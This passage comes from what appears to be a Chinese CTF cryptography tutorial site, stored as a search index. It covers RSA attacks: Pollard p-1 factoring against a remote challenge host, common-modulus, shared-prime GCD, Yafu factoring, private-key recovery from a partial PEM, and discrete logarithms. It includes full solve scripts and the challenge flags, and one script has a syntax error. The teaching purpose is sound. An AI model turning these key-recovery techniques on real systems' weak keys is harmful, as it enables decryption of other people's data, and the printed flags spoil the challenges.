\u5176\u4e2d\u4e00\u4e2a\u4e3a\u771f\uff0c\u6574\u4e2a\u8868\u8fbe\u5f0f\u5c31\u4e3a\u771f</li> <li>\u00acA \u662f\u5bf9\u547d\u9898 A \u7684\u53d6\u53cd</li> </ul> <p>2. CNF\uff08\u5408\u53d6\u8303\u5f0f\uff09</p> <p>\u5408\u53d6\u8303\u5f0f\uff08CNF\uff09\u662f\u6307\u5c06\u4e00\u4e2a\u547d\u9898\u516c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u79cd\u7279\u5b9a\u5f62\u5f0f\uff0c\u4f7f\u5f97\u6574\u4e2a\u516c\u5f0f\u7531\u591a\u4e2a\u5b50\u516c\u5f0f\u901a\u8fc7\u201c\u4e0e\u201d\uff08AND\uff09\u8fde\u63a5\u7ec4\u6210\uff0c\u5e76\u4e14\u6bcf\u4e2a\u5b50\u516c\u5f0f\u5185\u90e8\u662f\u7531\u591a\u4e2a\u547d\u9898\u53d8\u91cf\u901a\u8fc7\u201c\u6216\u201d\uff08OR\uff09\u8fde\u63a5\u7684\u5f62\u5f0f</p> <ul> <li>**\u5b57\u53e5\uff1a**\u4e00\u4e2a\u5b57\u53e5\u662f\u7531\u547d\u9898\u53d8\u91cf\u6216\u5176\u5426\u5b9a\u901a\u8fc7\u201c\u6216\u201d\u8fde\u63a5\u7684\u8868\u8fbe\u5f0f\u3002\u6bd4\u5982\uff0cA\u2228B \u6216 \u00acA\u2228C\u2228D \u90fd\u662f\u5b57\u53e5</li> <li>**\u5408\u53d6\uff1a**\u5c31\u662f\u591a\u4e2a\u5b57\u53e5\u901a\u8fc7\u201c\u4e0e\u201d\u8fde\u63a5\uff0c\u6bd4\u5982\uff0c(A\u2228B)\u2227(\u00acC\u2228D\u2228E) \u5c31\u662f\u4e00\u4e2a\u5408\u53d6</li> </ul> <p>3. DNF\uff08\u6790\u53d6\u8303\u5f0f\uff09</p> <p>\u6790\u53d6\u8303\u5f0f\uff08DNF\uff09\u662f\u6307\u5c06\u4e00\u4e2a\u547d\u9898\u516c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u79cd\u7279\u5b9a\u5f62\u5f0f\uff0c\u4f7f\u5f97\u6574\u4e2a\u516c\u5f0f\u7531\u591a\u4e2a\u5b50\u516c\u5f0f\u901a\u8fc7\u201c\u6216\u201d\uff08OR\uff09\u8fde\u63a5\u7ec4\u6210\uff0c\u5e76\u4e14\u6bcf\u4e2a\u5b50\u516c\u5f0f\u5185\u90e8\u662f\u7531\u591a\u4e2a\u547d\u9898\u53d8\u91cf\u901a\u8fc7\u201c\u4e0e\u201d\uff08AND\uff09\u8fde\u63a5\u7684\u5f62\u5f0f</p> <ul> <li>**\u5408\u53d6\uff1a**\u5728 DNF \u4e2d\uff0c\u5b50\u516c\u5f0f\u5185\u90e8\u662f\u901a\u8fc7\u201c\u4e0e\u201d\u8fde\u63a5\u7684\u547d\u9898\u53d8\u91cf\u3002</li> <li>**\u6790\u53d6\uff1a**\u5c31\u662f\u591a\u4e2a\u5408\u53d6\u5b50\u516c\u5f0f\u901a\u8fc7\u201c\u6216\u201d\u8fde\u63a5\u3002\u6bd4\u5982\uff0c(A\u2227\u00acB)\u2228(C\u2227D)\u2228(E\u2227F) \u90fd\u662f\u5408\u53d6\uff0c\u591a\u4e2a\u5408\u53d6\u901a\u8fc7\u201c\u6216\u201d\u8fde\u63a5\u5c31\u6210\u4e86\u6790\u53d6</li> </ul> <p>\u9996\u5148\u5206\u6790\u7a0b\u5e8f\u903b\u8f91\uff1a</p> <ol> <li> <p>\u63a5\u53d7\u8f93\u5165\u540e\u8c03\u7528 <code>translate</code> \u65b9\u6cd5\u5c06\u6bcf\u4e2a\u7b26\u53f7\u5bf9\u5e94\u7684\u7d20\u6570\u8fdb\u884c\u5e42\u8fd0\u7b97\uff0c\u7136\u540e\u5c06\u6240\u6709\u7ed3\u679c\u76f8\u4e58</p> </li> <li> <p>\u8c03\u7528 <code>random_proposition</code> \u65b9\u6cd5\u751f\u6210\u4e00\u4e2a\u968f\u673a\u547d\u9898\uff0c\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u6574\u6570 <code>p</code></p> </li> <li> <p>\u4f7f\u7528 <code>p</code> \u4f5c\u4e3a\u53c2\u6570\u8c03\u7528 <code>encrypt</code> \u51fd\u6570\u8fdb\u884c\u52a0\u5bc6</p> </li> <li> <p>\u6700\u540e\uff0c\u7a0b\u5e8f\u8f93\u51fa\u52a0\u5bc6\u540e\u7684\u5bc6\u6587 <code>c</code>\u3001\u6a21\u6570 <code>n</code> \u4ee5\u53ca <code>reslist</code> \u4e2d\u4e24\u4e2a\u6574\u6570\u7684\u6700\u5927\u516c\u7ea6\u6570\uff08GCD\uff09\u4f5c\u4e3a\u63d0\u793a</p> </li> </ol> <p>\u7531\u4e8e <code>p</code> \u662f\u901a\u8fc7 <code>nextprime(para)</code> \u751f\u6210\u7684\uff0c\u800c <code>para</code> \u662f <code>translate</code> \u7684\u7ed3\u679c</p> <p>\u5176\u65b9\u6cd5\u5185\u90e8\u53c8\u8c03\u7528\u4e86 <code>generate_primes</code> \u4ece 2 \u751f\u6210\u8fde\u7eed\u7d20\u6570\u5217\u8868</p> <p>\u901a\u8fc7\u6784\u9020\u4e00\u4e2a\u7684\u6570 <code>t</code> \u4e3a\u8fd9\u4e9b\u7d20\u6570\u7684\u5e42\u7684\u4e58\u79ef\uff0c\u4f7f\u5f97 <code>t</code> \u662f <code>p-1</code> \u7684\u500d\u6570\uff08\u8db3\u591f\u5927\u7684\u6307\u6570\u5982 150\uff09\uff0c\u4ece\u800c\u5229\u7528 \u8d39\u9a6c\u5c0f\u5b9a\u7406 \u5206\u89e3 <code>n</code></p> <pre><code>\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6307\u51fa\uff0c\u5982\u679c p \u662f\u4e00\u4e2a\u7d20\u6570\uff0c\u4e14 a \u4e0d\u662f p \u7684\u500d\u6570\uff0c\u90a3\u4e48\n</code></pre> \\[ \\begin{aligned} &amp;a^{p-1}\\ =\\ 1\\ (mod\\ p)\\\\ &amp;a^{k(p-1)}\\ =\\ 1^k\\ (mod\\ p) \\end{aligned} \\] <pre><code>from Crypto.Util.number import *\nfrom sympy import nextprime\nfrom pwn import *\n\n\nt = 1\na = 2\nfor i in range(20):\n    t *= a**150\n    a = nextprime(a)\n\nwhile(1):\n    sh = remote(\"node5.buuoj.cn\",28758)\n    sh.sendline(\"p\".encode('utf-8'))\n\n    sh.recvuntil(b\"random_pro: \")\n    random_pro = sh.recvline().decode('utf-8')\n    print(\"random_pro\", random_pro)\n\n    sh.recvuntil(b\"c: \")\n    c = int(sh.recvline().strip().decode())\n    print(\"c\", c)\n\n    sh.recvuntil(b\"n: \")\n    n = int(sh.recvline().strip().decode())\n    print(\"n\", n)\n\n    sh.recvuntil(b\"tip: \")\n    tip = int(sh.recvline().strip().decode())\n    print(\"tip\", tip)\n\n    # \u5982\u679c\u7ed3\u679c\u65e2\u4e0d\u662f 1 \u4e5f\u4e0d\u662f n\uff0c\u5219\u8bf4\u660e\u627e\u5230\u4e86 n \u7684\u4e00\u4e2a\u975e\u5e73\u51e1\u56e0\u5b50 p\n    if(GCD(pow(2,t,n)-1,n) != 1 and GCD(pow(2,t,n)-1,n) != n):\n        p = GCD(pow(2,t,n)-1,n)\n        q = n // p\n        phi = (p-1)*(q-1)\n        d = inverse(65537,phi)\n        print(long_to_bytes(pow(c,d,n)))\n        exit()\n\n    sh.close()\n</code></pre> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Crypto/Chapter6/6-14/","title":"\u5171\u6a21\u653b\u51fb\uff08\u76f8\u540c n\uff09","text":""},{"location":"Crypto/Chapter6/6-14/#\u5171\u6a21\u653b\u51fb\u76f8\u540c-n","title":"\u5171\u6a21\u653b\u51fb\uff08\u76f8\u540c n\uff09","text":"<p>\u5148\u4ece\u4e24\u4e2a\u516c\u94a5\u6587\u4ef6\u4e2d\u63d0\u53d6\u516c\u94a5\u4fe1\u606f</p> <pre><code>from Crypto.PublicKey import RSA\n\nf1 = open(\"F:\\\\ChromeCommon\\\\c2d6e7158d7b4cd6a747774f0bdc5f72\\\\publickey1.pem\",\"rb\").read()\nf2 = open(\"F:\\\\ChromeCommon\\\\c2d6e7158d7b4cd6a747774f0bdc5f72\\\\publickey2.pem\",\"rb\").read()\npub1 = RSA.importKey(f1)\npub2 = RSA.importKey(f2)\nn1 = pub1.n\ne1 = pub1.e\nn2 = pub2.n\ne2 = pub2.e\nprint(n1)\nprint(n2)\nprint(e1)\nprint(e2)\n</code></pre> <pre><code>n1 = 13060424286033164731705267935214411273739909173486948413518022752305313862238166593214772698793487761875251030423516993519714215306808677724104692474199215119387725741906071553437840256786220484582884693286140537492541093086953005486704542435188521724013251087887351409946184501295224744819621937322469140771245380081663560150133162692174498642474588168444167533621259824640599530052827878558481036155222733986179487577693360697390152370901746112653758338456083440878726007229307830037808681050302990411238666727608253452573696904083133866093791985565118032742893247076947480766837941319251901579605233916076425572961\nn2 = 13060424286033164731705267935214411273739909173486948413518022752305313862238166593214772698793487761875251030423516993519714215306808677724104692474199215119387725741906071553437840256786220484582884693286140537492541093086953005486704542435188521724013251087887351409946184501295224744819621937322469140771245380081663560150133162692174498642474588168444167533621259824640599530052827878558481036155222733986179487577693360697390152370901746112653758338456083440878726007229307830037808681050302990411238666727608253452573696904083133866093791985565118032742893247076947480766837941319251901579605233916076425572961\ne1 = 117\ne2 = 65537\n</code></pre> <p>\u53d1\u73b0 n1 == n2\uff0c\u91c7\u7528\u5171\u6a21\u653b\u51fb</p> <p>\u7531\u4e8e e\u2081 \u548c e\u2082 \u4e92\u8d28\uff0c\u53ef\u4ee5\u627e\u5230\u6574\u6570 s \u548c t \u4f7f\u5f97</p> <pre><code>e\u2081\u00b7s + e\u2082\u00b7t = 1\n</code></pre> <p>\u5982\u679c s \u4e3a\u6b63\u6570</p> <pre><code>m \u2261 c\u2081\u02e2\u00b7c\u2082\u1d57 mod N\n</code></pre> <p>\u5982\u679c s \u4e3a\u8d1f\u6570</p> <pre><code># \u5176\u4e2d c\u2081\u207b\u00b9 \u662f c\u2081 \u7684\u6a21\u9006\u5143\nm \u2261 (c\u2081\u207b\u00b9)\u1d43\u00b7c\u2082\u1d57 mod N\n</code></pre> <pre><code>from Crypto.Util.number import long_to_bytes, bytes_to_long\nfrom Crypto.PublicKey import RSA\nfrom gmpy2 import gcd, invert\n\n\ndef extended_gcd(a, b):\n    \"\"\"\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff0c\u8fd4\u56de(g, x, y)\u4f7f\u5f97ax + by = g = gcd(a, b)\"\"\"\n    if a == 0:\n        return b, 0, 1\n    else:\n        g, y, x = extended_gcd(b % a, a)\n        return g, x - (b // a) * y, y\n\n\n# \u8bfb\u53d6\u7b2c\u4e00\u4e2a\u516c\u94a5\nwith open('pic/publickey1.pem', 'rb') as f:\n    pub1 = RSA.importKey(f.read())\nn = pub1.n\ne1 = pub1.e\n\n# \u8bfb\u53d6\u7b2c\u4e8c\u4e2a\u516c\u94a5\nwith open('pic/publickey2.pem', 'rb') as f:\n    pub2 = RSA.importKey(f.read())\ne2 = pub2.e\n\n# \u9a8c\u8bc1\u4e24\u4e2a\u516c\u94a5\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570\nif pub1.n != pub2.n:\n    raise ValueError(\"\u4e24\u4e2a\u516c\u94a5\u5fc5\u987b\u4f7f\u7528\u76f8\u540c\u7684\u6a21\u6570n\")\n\n# \u8bfb\u53d6\u5bc6\u6587\nwith open('pic/cipher1.txt', 'rb') as f:\n    c1 = bytes_to_long(f.read())\n\nwith open('pic/cipher2.txt', 'rb') as f:\n    c2 = bytes_to_long(f.read())\n\n# \u8ba1\u7b97\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7cfb\u6570\ng, s1, s2 = extended_gcd(e1, e2)\n\n# \u786e\u4fdd gcd(e1, e2) = 1\nif g != 1:\n    raise ValueError(\"\u6307\u6570 e1 \u548c e2 \u5fc5\u987b\u4e92\u8d28\")\n\n# \u5904\u7406\u8d1f\u6307\u6570\u60c5\u51b5\nif s1 &lt; 0:\n    s1 = -s1\n    c1 = invert(c1, n)\nelif s2 &lt; 0:\n    s2 = -s2\n    c2 = invert(c2, n)\n\n# \u8ba1\u7b97\u660e\u6587: m = (c1^s1 * c2^s2) mod n\nm = pow(c1, s1, n) * pow(c2, s2, n) % n\n\n# \u8f93\u51fa\u7ed3\u679c\nprint(\"Recovered message:\", long_to_bytes(m).decode())\n</code></pre>"},{"location":"Crypto/Chapter6/6-15/","title":"\u516c\u5171 p\uff08n \u5747\u4e0d\u76f8\u540c\uff09","text":""},{"location":"Crypto/Chapter6/6-15/#\u516c\u5171-pn-\u5747\u4e0d\u76f8\u540c","title":"\u516c\u5171 p\uff08n \u5747\u4e0d\u76f8\u540c\uff09","text":"<p>\u6253\u5f00\u9644\u4ef6</p> <p></p> <p>\u7ed9\u5b9a\u4e24\u4e2a\u4e0d\u540c\u7684 n \u7684\u65f6\u5019\u4e00\u5b9a\u8981\u770b\u770b n1\uff0cn2 \u6709\u6ca1\u6709\u6700\u5927\u516c\u7ea6\u6570\uff08\u7d20\u6570\uff09</p> <p>\u5982\u679c\u6709\uff0c\u90a3\u4e48\u8be5\u6700\u5927\u516c\u7ea6\u6570\u5c31\u662f\u4e24\u8005\u5171\u540c\u7684 p</p> <pre><code>import gmpy2, libnum\nfrom Crypto.Util.number import long_to_bytes\n\n\n# \u7528\u4e8e\u6c42\u89e3a\u548cb\u7684\u6700\u5927\u516c\u7ea6\u6570\ndef get_p(a, b):\n    p = gmpy2.gcd(a, b)\n    return p\n\n\nif __name__ == '__main__':\n    n1 = 23220619839642624127208804329329079289273497927351564011985292026254914394833691542552890810511751239656361686073628273309390314881604580204429708461587512500636158161303419916259271078173864800267063540526943181173708108324471815782985626723198144643256432774984884880698594364583949485749575467318173034467846143380574145455195152793742611717169602237969286580028662721065495380192815175057945420182742366791661416822623915523868590710387635935179876275147056396018527260488459333051132720558953142984038635223793992651637708150494964785475065404568844039983381403909341302098773533325080910057845573898984314246089\n    c1 = 9700614748413503291260966231863562117502096284616216707445276355274869086619796527618473213422509996843430296526594113572675840559345077344419098900818709577642324900405582499683604786981144099878021784567540654040833912063141709913653416394888766281465200682852378794478801329251224801006820925858507273130504236563822120838520746270280731121442839412258397191963036040553539697846535038841541209050503061001070909725806574230090246041891486506980939294245537252610944799573920844235221096956391095716111629998594075762507345430945523492775915790828078000453705320783486744734994213028476446922815870053311973844961\n    n2 = 22642739016943309717184794898017950186520467348317322177556419830195164079827782890660385734113396507640392461790899249329899658620250506845740531699023854206947331021605746078358967885852989786535093914459120629747240179425838485974008209140597947135295304382318570454491064938082423309363452665886141604328435366646426917928023608108470382196753292656828513681562077468846105122812084765257799070754405638149508107463233633350462138751758913036373169668828888213323429656344812014480962916088695910177763839393954730732312224100718431146133548897031060554005592930347226526561939922660855047026581292571487960929911\n    c2 = 20513108670823938405207629835395350087127287494963553421797351726233221750526355985253069487753150978011340115173042210284965521215128799369083065796356395285905154260709263197195828765397189267866348946188652752076472172155755940282615212228370367042435203584159326078238921502151083768908742480756781277358357734545694917591921150127540286087770229112383605858821811640935475859936319249757754722093551370392083736485637225052738864742947137890363135709796410008845576985297696922681043649916650599349320818901512835007050425460872675857974069927846620905981374869166202896905600343223640296138423898703137236463508\n    e = 65537\n\n    # \u62ff\u5230\u5171\u540c\u7684p\uff0c\u518d\u5206\u522b\u6c42\u51fa\u5404\u81ea\u7684\u7d20\u6570q\n    p = get_p(n1, n2)\n    q1 = n1 // p\n    q2 = n2 // p\n\n    # \u6c42\u79c1\u94a5d\uff0c\u53e6\u5916gmpy2.invert()\u51fd\u6570\u548clibnum.invmod()\u51fd\u6570\u7b49\u4ef7\n    d1 = libnum.invmod(e, (p - 1) * (q1 - 1))\n    d2 = libnum.invmod(e, (p - 1) * (q2 - 1))\n\n    # \u5c06\u5bc6\u6587c\u7528\u79c1\u94a5d\u89e3\u5bc6\u6210\u660e\u6587\n    m1 = gmpy2.powmod(c1, d1, n1)\n    m2 = gmpy2.powmod(c2, d2, n2)\n\n    # \u5c06\u660e\u6587\u8f6c\u5b57\u7b26\n    message = long_to_bytes(m1) + long_to_bytes(m2)\n    print(message.decode())\n</code></pre>"},{"location":"Crypto/Chapter6/6-16/","title":"Yafu \u56e0\u5f0f\u5206\u89e3\uff08n \u8fc7\u5c0f\u5206\u89e3\u51fa\u591a\u4e2a p\uff09","text":""},{"location":"Crypto/Chapter6/6-16/#yafu-\u56e0\u5f0f\u5206\u89e3n-\u8fc7\u5c0f\u5206\u89e3\u51fa\u591a\u4e2a-p","title":"Yafu \u56e0\u5f0f\u5206\u89e3\uff08n \u8fc7\u5c0f\u5206\u89e3\u51fa\u591a\u4e2a p\uff09","text":"<p>\u7ed9\u51fa\u4e00\u4e32\u4ee3\u7801\uff0c\u5927\u6982\u770b\u4e00\u773c\u662f\u7c7b\u4f3c RSA \u7684\u52a0\u5bc6\u7b97\u6cd5</p> <p>\u4f46\u662f\u5176 n \u7684\u9009\u53d6\u5e76\u975e 2 \u4e2a\u7d20\u6570\u7684\u4e58\u79ef\uff0c\u800c\u662f 5 \u4e2a\u7d20\u6570\u7684\u4e58\u79ef\uff0c\u6240\u4ee5\u5e76\u4e0d\u662f\u6807\u51c6\u7684 RSA \u52a0\u5bc6</p> <pre><code>import libnum\nfrom Crypto.Util import number\nfrom functools import reduce\nfrom secret import flag\n\nn = 5\nsize = 64\nwhile True:\n    ps = [number.getPrime(size) for _ in range(n)]\n    if len(set(ps)) == n:\n        break\n\ne = 65537\nn = reduce(lambda x, y: x*y, ps)\nm = libnum.s2n(flag)\nc = pow(m, e, n)\n\nprint('n = %d' % n)\nprint('c = %d' % c)\n</code></pre> <pre><code>n = 175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921\nc = 144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168\n</code></pre> <p>\u4e0b\u8f7d Yafu\uff0c\u5148\u719f\u6089\u4e0b\u547d\u4ee4</p> <pre><code>yafu-x64.exe \"factor(6)\"\n</code></pre> <p></p> <p>\u5982\u679c\u56e0\u6570\u8fc7\u957f\uff0c\u5c06\u56e0\u6570\u7528\u6587\u672c\u6587\u4ef6\u5b58\u653e\u5728 yafu \u76ee\u5f55\u4e0b</p> <p>\u6587\u4ef6\u6700\u540e\u4e00\u884c\u4e00\u5b9a\u8981\u6362\u884c\uff0c\u5426\u5219 eof; done processing batchfile</p> <pre><code>yafu-x64.exe \"factor(@)\" -batchfile data.txt\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u5c31\u6210\u529f\u62ff\u5230\u4e86\u4e94\u4e2a p</p> <p></p> <p>\u89e3\u5bc6\u7b97\u6cd5\u4e0e RSA \u89e3\u5bc6\u7c7b\u4f3c\uff0c\u53ea\u662f phi \u8981\u53d8\u4e3a\u591a\u4e2a\uff08\u7d20\u6570-1\uff09\u7684\u4e58\u79ef</p> <p>\u518d\u5229\u7528 e \u548c phi \u6c42\u89e3\u9006\u5143 d\uff0c\u6700\u540e\u89e3\u5bc6\u5373\u53ef</p> <pre><code>from Crypto.Util.number import long_to_bytes,bytes_to_long,inverse\n\nc = 144009221781172353636339988896910912047726260759108847257566019412382083853598735817869933202168\nn = 175797137276517400024170861198192089021253920489351812147043687817076482376379806063372376015921\ne = 65537\np1 = 9401433281508038261\np2 = 11855687732085186571\np3 = 13716847112310466417\np4 = 11215197893925590897\np5 = 10252499084912054759\n\nphi = (p1-1)*(p2-1)*(p3-1)*(p4-1)*(p5-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\n\nprint(long_to_bytes(m))\n</code></pre> <pre><code>HSCTF{@Tv0_br3ad5_c1ip_cHe3se_!@}\n</code></pre>"},{"location":"Crypto/Chapter6/6-17/","title":"RSA \u79c1\u94a5\u6062\u590d","text":""},{"location":"Crypto/Chapter6/6-17/#rsa-\u79c1\u94a5\u6062\u590d","title":"RSA \u79c1\u94a5\u6062\u590d","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u53ea\u7ed9\u4e86\u79c1\u94a5\u4e0b\u534a\u90e8\u5206</p> <p></p> <pre><code>Os9mhOQRdqW2cwVrnNI72DLcAXpXUJ1HGwJBANWiJcDUGxZpnERxVw7s0913WXNtV4GqdxCzG0pG5EHThtoTRbyX0aqRP4U/hQ9tRoSoDmBn+3HPITsnbCy67VkCQBM4xZPTtUKM6Xi+16VTUnFVs9E4rqwIQCDAxn9UuVMBXlX2Cl0xOGUF4C5hItrX2woF7LVS5EizR63CyRcPovMCQQDVyNbcWD7N88MhZjujKuSrHJot7WcCaRmTGEIJ6TkU8NWt9BVjR4jVkZ2EqNd0KZWdQPukeynPcLlDEkIXyaQx\n</code></pre> <p>\u5148\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236</p> <pre><code>3acf6684e41176a5b673056b9cd23bd832dc017a57509d471b024100d5a225c0d41b16699c4471570eecd3dd7759736d5781aa7710b31b4a46e441d386da1345bc97d1aa913f853f850f6d4684a80e6067fb71cf213b276c2cbaed5902401338c593d3b5428ce978bed7a553527155b3d138aeac084020c0c67f54b953015e55f60a5d31386505e02e6122dad7db0a05ecb552e448b347adc2c9170fa2f3024100d5c8d6dc583ecdf3c321663ba32ae4ab1c9a2ded6702691993184209e93914f0d5adf415634788d5919d84a8d77429959d40fba47b29cf70b943124217c9a431\n</code></pre> <p>\u6839\u636e OpenSSL \u79c1\u94a5\u7ed3\u6784\uff0c\u79c1\u94a5\u4fe1\u606f\u6309\u5982\u4e0b\u987a\u5e8f\u6392\u5217\uff1a</p> <pre><code>version | pad | n | pad | e | pad | d | pad | p | pad | q | pad | x1 | pad | x2 | pad | x3\n</code></pre> <p>\u5176\u4e2d\uff1a</p> <ul> <li><code>x1 = d mod (p-1)</code></li> <li><code>x2 = d mod (q-1)</code></li> <li><code>x3 = p^(-1) mod q</code></li> </ul> <p>\u4ece\u89e3\u7801\u540e\u7684\u6570\u636e\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u8bc6\u522b\u51fa\u4e09\u4e2a\u5173\u952e\u53c2\u6570\uff08\u4ee5<code>0241</code>\u6807\u7b7e\u5934\u6807\u8bc6\uff09\uff1a</p> <ol> <li>x1 = d mod (p-1)</li> </ol> <pre><code>00d5a225c0d41b16699c4471570eecd3dd7759736d5781aa7710b31b4a46e441d386da1345bc97d1aa913f853f850f6d4684a80e6067fb71cf213b276c2cbaed59\n</code></pre> <ol> <li>x2 = d mod (q-1)</li> </ol> <pre><code>1338c593d3b5428ce978bed7a553527155b3d138aeac084020c0c67f54b953015e55f60a5d31386505e02e6122dad7db0a05ecb552e448b347adc2c9170fa2f3\n</code></pre> <ol> <li>(q-1) mod p</li> </ol> <pre><code>00d5c8d6dc583ecdf3c321663ba32ae4ab1c9a2ded6702691993184209e93914f0d5adf415634788d5919d84a8d77429959d40fba47b29cf70b943124217c9a431\n</code></pre> <p>\u6839\u636e RSA \u79c1\u94a5\u7684\u6027\u8d28\uff0c\u6211\u4eec\u77e5\u9053\uff1a</p> <pre><code>d\u00b7e \u2261 1 mod (p-1)(q-1)\n</code></pre> <p>\u7531\u6b64\u53ef\u4ee5\u63a8\u5bfc\u51fa\uff1a</p> <pre><code>d\u00b7e \u2261 1 mod (p-1) \u548c d\u00b7e \u2261 1 mod (q-1)\n</code></pre> <p>\u7531\u4e8e x1 \u548c x2 \u7684\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5f97\u5230\uff1a</p> <pre><code>x1\u00b7e \u2261 1 mod (p-1)\nx2\u00b7e \u2261 1 mod (q-1)\n</code></pre> <p>\u56e0\u6b64\uff1a</p> <pre><code>(p-1) | (x1\u00b7e - 1)\n(q-1) | (x2\u00b7e - 1)\n</code></pre> <p>\u8bbe\uff1a</p> <pre><code>x1\u00b7e - 1 = r1\u00b7(p - 1)\nx2\u00b7e - 1 = r2\u00b7(q - 1)\n</code></pre> <p>\u7531\u4e8ex1 = d mod (p-1)\uff0c\u5219 x1 &lt; (p-1)\uff0c\u53ef\u4ee5\u8fd1\u4f3c\u8ba4\u4e3a x1\u00b7e \u2248 r1\u00b7(p-1)\uff0c\u56e0\u6b64 r1 &lt; e\uff1b\u540c\u7406 r2 &lt; e</p> <p>\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe e=65537\uff0c\u7136\u540e\u5c1d\u8bd5\u627e\u51fa r1 \u548c r2</p> <pre><code>import gmpy2\nimport rsa\nfrom Crypto.Util.number import isPrime\n\nx1 = \"0xd5a225c0d41b16699c4471570eecd3dd7759736d5781aa7710b31b4a46e441d386da1345bc97d1aa913f853f850f6d4684a80e6067fb71cf213b276c2cbaed59\"\nx2 = \"0x1338c593d3b5428ce978bed7a553527155b3d138aeac084020c0c67f54b953015e55f60a5d31386505e02e6122dad7db0a05ecb552e448b347adc2c9170fa2f3\"\nx3 = \"0xd5c8d6dc583ecdf3c321663ba32ae4ab1c9a2ded6702691993184209e93914f0d5adf415634788d5919d84a8d77429959d40fba47b29cf70b943124217c9a431\"\n\nx1 = int(x1, 16)\nx2 = int(x2, 16)\nx3 = int(x3, 16)\n\ndef genKey(X1, X2):\n    e = 65537\n    N1 = X1 * e - 1\n    N2 = X2 * e - 1\n\n    # \u5bfb\u627e p\n    for r in range(e):\n        if N1 % (e - r) == 0:\n            p = int(N1 // (e - r) + 1\n            if isPrime(p):\n                print(\"r1 =\", r)\n                break\n\n    # \u5bfb\u627e q\n    for r in range(e):\n        if N2 % (e - r) == 0:\n            q = int(N2 // (e - r) + 1\n            if isPrime(q):\n                print(\"r2 =\", r)\n                break\n\n    n = p * q\n    phi = (p - 1) * (q - 1)\n    d = int(gmpy2.invert(e, phi))\n\n    # \u9a8c\u8bc1 x3 \u662f\u5426\u6b63\u786e\n    assert gmpy2.invert(q, p) == x3\n\n    privatekey = rsa.PrivateKey(n, e, d, p, q)\n    with open(\"flag.enc\", \"rb\") as f:\n        print(rsa.decrypt(f.read(), privatekey).decode())\n\ngenKey(x1, x2)\n</code></pre> <pre><code>0ctf{Keep_ca1m_and_s01ve_the_RSA_Eeeequati0n!!!}\n</code></pre>"},{"location":"Crypto/Chapter6/6-18/","title":"\u79bb\u6563\u5bf9\u6570\uff08g^m \u2261 c mod p\uff09","text":""},{"location":"Crypto/Chapter6/6-18/#\u79bb\u6563\u5bf9\u6570gm--c-mod-p","title":"\u79bb\u6563\u5bf9\u6570\uff08g^m \u2261 c mod p\uff09","text":"<p>\u4e0b\u8f7d\u9644\u4ef6</p> <p>\u8fd9\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a**\u79bb\u6563\u5bf9\u6570\u95ee\u9898**\uff08Discrete Logarithm Problem, DLP\uff09\uff1a\u7ed9\u5b9a <code>g</code>, <code>p</code>, <code>c</code>\uff0c\u6c42 <code>m</code> \u4f7f\u5f97 <code>g^m \u2261 c mod p</code></p> <pre><code>from Crypto.Util.number import *\nfrom random import *\nflag=b'key{xxxxxxx}'\nm=bytes_to_long(flag)\np=3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037\ng=3\nc=pow(g,m,p)\nprint(f'c=',c)\n\n#c=2806010417151035336440705514162974780232947158398198485734192667226413654468071006789004899454166950916976496577445879600303537754602011941433695536703970095800594654040421871366147069319806\n</code></pre> <p>\u4f7f\u7528 <code>discrete_log</code> \u51fd\u6570\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\uff1a\u627e\u5230 <code>m</code> \u4f7f\u5f97 <code>g^m \u2261 c mod p</code></p> <ul> <li><code>Mod(c, p)</code> \u8868\u793a <code>c</code> \u5728\u6a21 <code>p</code> \u4e0b\u7684\u5269\u4f59\u7c7b</li> <li><code>Mod(g, p)</code> \u8868\u793a <code>g</code> \u5728\u6a21 <code>p</code> \u4e0b\u7684\u5269\u4f59\u7c7b</li> <li><code>discrete_log</code> \u51fd\u6570\u4f1a\u8fd4\u56de\u6ee1\u8db3 <code>g^m \u2261 c mod p</code> \u7684 <code>m</code></li> </ul> <pre><code># sage\nfrom Crypto.Util.number import *\n\np = 3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037\nc = 2806010417151035336440705514162974780232947158398198485734192667226413654468071006789004899454166950916976496577445879600303537754602011941433695536703970095800594654040421871366147069319806\ng = 3\n\nflag = discrete_log(Mod(c,p),Mod(g,p))\nprint(long_to_bytes(flag))\n</code></pre>"},{"location":"Crypto/Chapter6/6-19/","title":"Lattice \u6c42\u89e3\u6a21\u6570 n\uff08\u5b58\u5728\u5c0f\u91cf \uff0c\u63d0\u4f9b\u591a\u4e2a\u65b9\u7a0b\u7ec4\u53c2\u6570\uff09","text":""},{"location":"Crypto/Chapter6/6-19/#lattice-\u6c42\u89e3\u6a21\u6570-n\u5b58\u5728\u5c0f\u91cf-\u63d0\u4f9b\u591a\u4e2a\u65b9\u7a0b\u7ec4\u53c2\u6570","title":"Lattice \u6c42\u89e3\u6a21\u6570 n\uff08\u5b58\u5728\u5c0f\u91cf \uff0c\u63d0\u4f9b\u591a\u4e2a\u65b9\u7a0b\u7ec4\u53c2\u6570\uff09","text":"<p>from secret import flag import random import gmpy2</p> <p>def generate_Key1(ebits):     e = [getPrime(ebits) for _ in range(4)]     return e</p> <p>def encrypt1(message,e):     n = gmpy2.next_prime(bytes_to_long(message) &lt;&lt; 300)     m = getPrime(256)     c = [int(pow(m,e[i],n)) for i in range(len(e))]     return c</p> <p>def generate_Key2(nbits):     p = 